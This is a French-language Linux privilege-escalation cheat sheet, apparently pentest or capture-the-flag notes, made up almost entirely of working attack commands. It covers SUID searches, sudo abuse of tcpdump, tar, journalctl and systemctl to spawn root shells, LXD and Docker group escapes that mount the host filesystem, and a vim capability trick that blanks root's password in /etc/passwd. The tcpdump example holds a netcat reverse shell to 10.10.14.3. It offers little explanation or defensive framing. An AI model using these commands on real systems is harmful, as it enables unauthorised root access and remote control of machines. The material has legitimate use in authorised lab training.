### SUID/SGID Binaries
> Chercher des binaires avec bit SUID/SGID pour exécuter avec les privilèges du propriétaire

```bash
# Trouver les binaires SUID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Trouver les binaires SGID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
### Sudo Rights Abuse
> Exploiter les droits sudo mal configurés

```bash
# Vérifier les droits sudo
sudo -l

# Exemple: exploiter tcpdump avec sudo
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f" > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
### Privileged Groups
> Exploiter l'appartenance à des groupes privilégiés
#### LXC/LXD Group
```bash
# Vérifier si on est dans le groupe LXD
id

# Initialiser LXD
lxd init

# Importer une image Alpine
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# Créer un conteneur privilégié
lxc init alpine r00t -c security.privileged=true

# Monter le système de fichiers hôte
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# Démarrer le conteneur et obtenir un shell
lxc start r00t
lxc exec r00t /bin/sh
```
#### Docker Group
```bash
# Monter le système de fichiers hôte dans un conteneur Docker
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
#### ADM Group
```bash
# Lire les logs pour trouver des informations sensibles
find /var/log -type f -exec grep -l "password" {} \;
```
### Capabilities
> Exploiter les capabilities Linux mal configurées

```bash
# Trouver les binaires avec capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null

# Exploiter vim avec cap_dac_override
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su root # Sans mot de passe
```

## Techniques d'élévation de privilèges Linux dans des Box
### Exploitation des droits SUID
Exemple (Image):
```bash
# Rechercher des binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Exploiter un binaire SUID vulnérable
/usr/bin/base64 /root/proof.txt | base64 -d
```
### Exploitation des droits sudo
Exemple (Cockpit):
```bash
# Vérifier les droits sudo
sudo -l

# Exploiter tar avec sudo
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
Exemple (Jordak):
```bash
# Exploiter journalctl avec sudo
sudo /usr/bin/journalctl -n5 -unostromo.service
# Puis taper "!/bin/bash" quand less est lancé
```
Exemple (Scrutiny):
```bash
# Exploiter systemctl avec sudo
sudo systemctl
!sh
```
### Exploitation des droits de groupe
Exemple (Extplorer):
```bash
# Exploiter l'appartenance au groupe disk
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
cat /root/proof.txt
```